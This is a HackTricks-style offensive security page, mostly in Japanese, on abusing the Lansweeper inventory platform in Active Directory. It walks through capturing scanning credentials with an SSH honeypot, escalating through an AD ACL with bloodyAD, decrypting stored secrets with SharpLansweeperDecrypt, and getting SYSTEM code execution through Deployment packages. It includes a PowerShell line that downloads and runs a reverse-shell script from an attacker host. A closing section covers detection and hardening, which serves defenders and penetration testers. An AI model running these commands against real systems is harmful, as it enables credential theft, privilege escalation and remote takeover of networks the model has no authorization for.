# Lansweeper Abuse: Credential Harvesting、Secrets Decryption、Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeperは、Windows上に導入され、Active Directoryと統合されることが多いIT asset discoveryおよびinventory platformです。Lansweeperで設定されたCredentialsは、SSH、SMB/WMI、WinRMなどのprotocol経由でassetsに認証するために、そのscanning enginesによって使用されます。Misconfigurationにより、以下が可能になることが頻繁にあります。

- scanning targetをattackerが制御するhost（honeypot）へredirectすることによるCredential interception
- Lansweeper関連groupによって公開されたAD ACLを悪用したremote accessの取得
- on-hostでのLansweeper設定済みsecrets（connection stringsおよびstored scanning credentials）のdecryption
- Deployment featureによるmanaged endpoints上でのcode execution（多くの場合SYSTEMとして実行）

このページでは、engagement中にこれらの動作をabuseするための実践的なattacker workflowとcommandsをまとめます。

## 1) honeypotでscanning credentialsをharvestする（SSH example）

Idea: 自分のhostを指すScanning Targetを作成し、既存のScanning Credentialsを割り当てます。scanが実行されると、Lansweeperはそれらのcredentialsでauthenticateを試み、honeypotがそれらをcaptureします。<sup>[[1]](#references)</sup>

Steps overview（web UI）:
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range（またはSingle IP）= 自分のVPN IP
- SSH portを到達可能なものに設定（例: 22がblockedの場合は2022）
- scheduleをdisableし、手動でtriggerするように計画
- Scanning → Scanning Credentials → Linux/SSH credsが存在することを確認し、新しいtargetに割り当てる（必要に応じてすべてenable）
- target上で「Scan now」をclick
- SSH honeypotをrunし、試行されたusername/passwordをretrieve

sshesameを使用したexample:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
取得した creds を DC services に対して検証する：
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
注記
- その他のプロトコルは同等ではありません。SMB/WinRM listener は通常、cleartext password ではなく NTLM challenge-response を取得します。これを cracking または relaying できるかどうかは、ネゴシエートされたプロトコル保護に依存します。詳しくは [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) を参照してください。SSH password authentication は、通常、最も単純な cleartext のケースです。
- SSH public-key authentication は、username と public-key fingerprint を server に公開しますが、**private key やその passphrase は公開しません**。honeypot がそれらを開示すると期待するのではなく、侵害された Lansweeper server から key-backed credentials を復元してください。<sup>[[2]](#references)</sup>
- 多くの scanner は、固有の client banner（例：RebexSSH）で自身を識別し、benign commands（uname、whoami など）を実行しようとします。

### Credential selection order matters

rescan では、Lansweeper はまず、その asset で最後に成功した credential を再試行し、次に設定された順序で明示的にマッピングされた credentials、最後に同じ type の global credential を試します。そのため、最初の password authentication を受け入れる honeypot では、通常、後続の fallback credentials は観測できません。完全な fallback sequence を検証することが目的の、認可された credential-path assessment では、試行を記録して拒否してください。<sup>[[6]](#references)</sup>

## 2) AD ACL abuse: app-admin group に自分自身を追加して remote access を取得する

BloodHound を使用して、侵害された account から有効な rights を列挙します。よくある発見は、scanner または app 固有の group（例：“Lansweeper Discovery”）が、privileged group（例：“Lansweeper Admins”）に対して GenericAll を持っているケースです。privileged group が “Remote Management Users” の member でもある場合、自分自身を追加すると WinRM が利用可能になります。<sup>[[1]](#references)[[5]](#references)</sup>

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
グループに対するGenericAllのExploit（BloodyAD、Linux）：<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
次に、interactive shellを取得します:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
ヒント: Kerberos の操作は時間に敏感です。KRB_AP_ERR_SKEW が発生した場合は、まず DC と時刻を同期してください:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) ホスト上でLansweeperが設定したsecretを復号する

Lansweeper serverでは、ASP.NET siteが通常、暗号化されたconnection stringとapplicationが使用するsymmetric keyを保存しています。適切なlocal accessがあれば、DB connection stringを復号し、保存されたscanning credentialsを抽出できます。<sup>[[1]](#references)</sup>

一般的な場所:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

SharpLansweeperDecryptを使用すると、復号と保存されたcredsのdumpを自動化できます。引数なしの場合、現在のexecutableが`web.config`を復号し、databaseに接続して、設定されているすべてのscanning credentialsをdumpします。`-e`は、暗号化されたvalueとkey fileがすでに利用可能な場合のoffline/manual decryptionにも対応しています。<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
期待される出力には、DB接続の詳細と、環境全体で使用されるWindowsおよびLinuxアカウントなどの平文のスキャン用認証情報が含まれます。これらはドメインホスト上で昇格されたローカル権限を持っていることがよくあります:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
回収したWindowsスキャン用認証情報を特権アクセスに使用:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“Lansweeper Admins”のメンバーである場合、Web UIにはDeploymentとConfigurationが公開されています。Deployment → Deployment packagesでは、対象のasset上で任意のコマンドを実行するpackageを作成できます。Lansweeperは管理者権限のscanning credentialを使用して対象のTask Schedulerと`C$`にアクセスし、deployment用のtaskを作成します。packageで**System Account** run modeを使用すると、payloadは`NT AUTHORITY\SYSTEM`として実行されます。その他のrun modeでは、マッピングされたscanning credentialまたは現在ログオンしているユーザーを使用できるため、SYSTEMであると決めつけず、選択したmodeを確認してください。<sup>[[1]](#references)[[7]](#references)</sup>

大まかな手順:
- PowerShellまたはcmdのワンライナー（reverse shell、add-userなど）を実行する新しいDeployment packageを作成します。
- 対象のasset（例: Lansweeperが稼働しているDC/host）を指定し、Deploy/Run nowをクリックします。
- SYSTEMとしてshellを受け取ります。

Payloadの例（PowerShell）:
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. 慎重に使用すること。

### Deployment artifacts and a second credential exposure point

Scanner は `C:\Windows\LSDeployment` にある Deployment executable を `C$` 経由で書き込みます。Package files は通常、`C:\Program Files (x86)\Lansweeper\PackageShare` をバックエンドとする `DefaultPackageShare$`、または IP range 固有の package share から読み取られます。重要なのは、Lansweeper のドキュメントによると、package-share credential が **Deployment を受け取るすべての computer の registry に、復号可能な暗号化形式で保存される**ことです。侵害された managed endpoint は、その share account の情報漏えいポイントになり得るものとして扱い、Lansweeper の活動を再構築する際は、Deployment directory、scheduled-task history、設定済みの package share を調査してください。<sup>[[7]](#references)</sup>

## Detection and hardening

- Anonymous SMB enumeration を制限または削除する。RID cycling と Lansweeper share への異常な access を監視する。
- Egress controls: scanner host からの outbound SSH/SMB/WinRM をブロックまたは厳格に制限する。非標準 port（例: 2022）や、Rebex のような通常とは異なる client banner を検知する。
- `Website\\web.config` と `Key\\Encryption.txt` を保護する。Secret を vault に外部化し、exposure 発生時には rotate する。最小権限の service account と、可能な場合は gMSA の利用を検討する。
- AD monitoring: Lansweeper 関連 group（例: “Lansweeper Admins”、“Remote Management Users”）の変更、および privileged group の membership に GenericAll/Write を付与する ACL 変更を検知する。
- Deployment package の作成・変更・実行を audit し、新しい remote scheduled task と `C:\Windows\LSDeployment` への書き込みを関連付ける。`cmd.exe`/`powershell.exe` を起動する package や、予期しない outbound connection を検知する。
- Package-share credential には **Read & Execute** 権限のみを付与し、administration 用に再利用しない。実用上可能な場合は agent-based inventory を優先する。すべての computer を agent で scan し、Deployment module を使用しない場合、Lansweeper は保存済みの computer scanning credential を必要としません。<sup>[[6]](#references)[[7]](#references)</sup>

## Related topics
- [SMB/LSA/SAMR enumeration と RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Kerberos authentication と clock-skew に関する考慮事項](kerberos-authentication.md)
- [BloodHound による path analysis](bloodhound.md)
- [WinRM の使用と lateral movement](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Lansweeper Scanning、AD ACL、Secret を悪用して DC を掌握する（0xdf）](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame（SSH honeypot）](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Scanning credential の作成と map — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Deployment requirements — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
